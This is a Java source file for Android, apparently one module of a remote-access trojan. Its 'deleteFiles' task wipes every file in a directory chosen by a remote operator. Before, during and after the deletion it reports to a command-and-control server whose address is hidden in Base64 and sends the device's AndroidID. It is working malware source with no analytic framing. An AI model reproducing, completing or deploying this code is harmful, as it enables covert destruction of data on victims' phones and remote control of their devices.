package com.asynctask;

import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.File;
import java.io.UnsupportedEncodingException;

/**
 * Created by Conan0xff on 2017/12/5.
 */

public class deleteFiles extends AsyncTask<String, Void, String> {
    String i = "0";

    public deleteFiles(String i) {
        this.i = i;
    }

    @Override
    protected String doInBackground(String... params) {

        File directory = new File(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("File", "") + File.separator + i);
//        	Log.i("com.connect", "Delete Files : " + directory.exists() + " : " + directory.toString());

        if (directory.exists()) {
            File[] files = directory.listFiles();
            for (int j = 0; j < files.length; j++) {
//		            	Log.i("com.connect", "File Deleted : " + files[j].toString());

                files[j].delete();
                try {
                    String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
                    CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "File Deleted: " + files[j].toString());
                } catch (UnsupportedEncodingException e) {

                    e.printStackTrace();
                }
            }
        }

        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Files", false).commit();
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", i + " Deleted");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }

    @Override
    protected void onPreExecute() {
        try {
            while (PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getBoolean("Files", false) == true) {
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Files", true).commit();
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Deleting " + i);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
